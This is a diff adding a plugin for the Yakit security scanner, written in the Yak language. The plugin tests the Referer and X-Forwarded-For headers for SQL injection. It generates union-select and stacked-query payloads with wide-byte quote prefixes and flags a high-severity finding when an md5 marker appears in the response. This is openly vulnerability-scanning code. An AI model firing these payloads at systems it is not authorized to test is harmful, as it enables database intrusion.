@@ -1,0 +1,145 @@
+yakit.AutoInitYakit()
+
+CheckHeaders = ["X-Forwarded-For","Referer"]
+
+// 检测是否是JavaScript文件
+isJavaScript = rsp => {
+    if poc.GetHTTPPacketContentType(rsp).Contains("javascript") {
+        return true
+    }
+    return false
+}
+
+exprInfo = fuzz.FuzzCalcExpr()
+expr = exprInfo.expr
+token = exprInfo.result
+basicItem = expr
+basicItem = `md5(%v)` % expr
+token = codec.Md5(exprInfo.result)
+yakit.Info("USE UnionItem: %v token: %v", basicItem, token)
+
+unionPayloads = func() {
+    var unionPayloads = []
+    var results = []
+    for i in 16 {
+        unionPayloads.Push(basicItem)
+        realPayload = "union select %v" % str.Join(unionPayloads, ",")
+        results.Push(realPayload)
+    }
+    return results
+}
+
+stackedPayloads = func() {
+    var payloads = []
+    var results = []
+    for i in 16 {
+        payloads.Push(basicItem)
+        realPayload = ";select %v" % str.Join(payloads, ",")
+        results.Push(realPayload)
+    }
+    return results
+}
+
+
+sqlBuildPrefix = func(value) {
+    pureInt = str.IsDigit(value)
+
+    wideByte = string([uint8(randn(129, 254))])
+    prefixs = []
+
+    valueList = [value]
+    boundaryList = [" ",")","))"]
+
+    formatString = "%s"
+    if !pureInt {
+        formatString = formatString + wideByte + "'"
+        valueList = append(valueList, randstr(10))
+    }
+    formatString = formatString + "%s and 1=0 "
+
+
+    for v  in valueList {
+        for b in boundaryList {
+            prefix = sprintf(formatString,v,b)
+            prefixs.Push(prefix)
+        }
+    }
+    return prefixs
+}
+
+generatePayloads = func(headerValue){
+    payloads = []
+    suffix = [" -- ", " # "]
+    prefix = sqlBuildPrefix(headerValue)
+    //Build Union Injection Payload
+    unionPayloads= unionPayloads()
+    check = i => func{
+        return str.Contains(i, token)
+    }
+    for p in prefix {
+        for s in suffix {
+            for unionPayload in unionPayloads {
+                finPayload = p + unionPayload + s
+                payloads = append(payloads,{"payload":finPayload,"check":check} )
+            }
+        }
+    }
+    //Build Stacked Injection Payload
+    stackedPayloads  = stackedPayloads()
+
+    for p in prefix {
+        for s in suffix {
+            for stackedPayload in stackedPayloads {
+                finPayload = p + stackedPayload  + s
+                payloads = append(payloads,{"payload":finPayload,"check":check} )
+            }
+        }
+    }
+    return payloads
+}
+
+sqlInjectionChecking = func(https, request) {
+    freq = fuzz.HTTPRequest(request, fuzz.https(https))~
+    url = str.ExtractURLFromHTTPRequestRaw(request, https)~.String()
+    yakit.Info("准备对 %v 进行 SQL 注入检查", url)
+    info = i => {
+        yakit.Info("检测URL: %v - %v", url, i)
+    }
+    for header in CheckHeaders{
+        headerValue= freq.GetHeader(header)
+        if headerValue == "" {
+            continue
+        }
+        payloads = generatePayloads(headerValue)
+        for p in payloads{
+            // info(p.payload)
+            rsp ,err = freq.FuzzHTTPHeader(header, p.payload).ExecFirst()
+            if err != nil {
+                yakit.Error("SQL注入检测失败，Payload:%s,Err:%s ",p.payload,err)
+                continue
+            }
+            if p.check(rsp.ResponseRaw){
+                yakit.Info("检测成功！payload: %s", p.payload)
+                risk.NewRisk(url, 
+                risk.type("sqlinjection"),
+                risk.title(f"SQL Injection-Dangerous HTTP Header: ${url}"),
+                risk.titleVerbose(f"SQL注入-高危 HTTP Header注入:${url}"),
+                risk.payload(p.payload),
+                risk.request(rsp.RequestRaw),
+                risk.response(rsp.ResponseRaw),
+                risk.severity("high"),
+                risk.details(f"HTTP Header ${header}存在SQL注入"),
+                risk.solution("使用参数化查询,使用 ORM（对象关系映射）框架,进行输入验证和过滤,代码遵循最小权限原则"),
+                risk.description("HTTP-高危Header-SQL注入检测会对常见存在SQL注入风险的Header(如Refer和X-Forwarded-For)进行常见的SQL注入检测")
+                )
+                return 
+            }
+        }
+    }
+}
+
+# mirrorNewWebsitePath 每新出现一个网站路径，关于这个网站路径的第一个请求，将会在这里被传入回调
+mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
+    if isJavaScript(rsp) { return }
+    sqlInjectionChecking(isHttps, req)
+}
